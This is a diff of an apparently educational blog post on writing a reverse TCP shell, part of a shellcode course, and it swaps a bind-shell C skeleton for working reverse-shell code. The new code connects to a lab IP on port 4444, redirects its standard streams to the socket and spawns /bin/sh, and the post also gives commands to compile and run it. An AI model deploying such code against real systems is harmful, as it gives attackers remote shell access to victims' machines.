@@ -17,7 +17,7 @@ classes: wide
 ------
 
 * Reverse connects to a configured IP address and port number
-* Executes a shell on an incoming connection
+* Executes a shell on a successful connection
 * IP address and port number should be easily configurable
 
 #### Concept 
@@ -27,7 +27,7 @@ A Reverse TCP shell initiates a connection from the target host back to the atta
 
 ![Reverse Shell](/assets/images/reverse_shell.jpg)
 
-Reverse shells have a significantly higher success rate than their bind shell counterparts due to the inherent nature of firewalls not filtering outbound connections. From the perspective of a firewall, typically a user would initiate outbound requests wheb browsing the web and related resources.
+Reverse shells have a significantly higher success rate than their bind shell counterparts due to the inherent nature of firewalls not filtering outbound connections. From the perspective of a firewall, a user would typically initiate outbound requests when browsing the web and related resources.
 
 #### Reverse TCP Shell in C
 --------
@@ -37,45 +37,33 @@ The following C skeleton code will be used to demonstrate the Reverse TCP shell 
 This will be used as a template for the low-level assembly code to follow:
 
 ```c
-#include <stdio.h>  
-#include <sys/types.h>   
-#include <sys/socket.h>  
-#include <netinet/in.h>  
-  
-int host_sockid;  // socket for host  
-int client_sockid;  // socket for client  
-      
-struct sockaddr_in hostaddr;  // sockaddr struct  
-  
-int main()  
-{  
-    // 1st syscall - create socket  
-    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
-  
-    // Create sockaddr struct 
-    hostaddr.sin_family = AF_INET;  // consists of AF_INET
-    hostaddr.sin_port = htons(4444);  // bind socket using port 4444  
-    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  // listen on any interface
-  
-    // 2nd syscall - bind socket to IP/Port in sockaddr struct  
-    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
-      
-    // 3rd syscall - listen for incoming connections  
-    listen(host_sockid, 2);  
-  
-    // 4th syscall - accept incoming connections    
-    client_sockid = accept(host_sockid, NULL, NULL);  
-  
-    // 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR  
-    dup2(client_sockid, 0);  
-    dup2(client_sockid, 1);  
-    dup2(client_sockid, 2);  
-  
-    // 6th syscall - execute /bin/sh using execve  
-    execve("/bin/sh", NULL, NULL);  
-    close(host_sockid);  
-      
-    return 0;  
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int main(void) {
+    // Declare variables
+    int sockfd;
+    struct sockaddr_in serv_addr;
+    // Create socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    // IP address family
+    serv_addr.sin_family = AF_INET;
+    // Destination IP address
+    serv_addr.sin_addr.s_addr = inet_addr("192.168.0.142");
+    // Destination port 
+    serv_addr.sin_port = htons(4444);
+    // Reverse connect to target IP address
+    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
+    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
+    int i;
+    for (i=0; i <= 2; i++){
+        dup2(sockfd, i);
+    }
+    // Execute /bin/sh using execve  
+    char *argv[] = {"/bin/sh", NULL};
+    execve(argv[0], argv, NULL);
 }
 ```
 
@@ -85,8 +73,8 @@ int main()
 The C code is compiled as an executable ELF binary and executed:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc shell_bind_tcp_poc.c -o shell_bind_tcp_poc
-osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp_poc 
+osboxes@osboxes:~/Downloads/SLAE$ gcc reverse_tcp_shell_poc.c -o reverse_tcp_shell_poc
+osboxes@osboxes:~/Downloads/SLAE$ ./reverse_tcp_shell_poc 
 
 ```
 
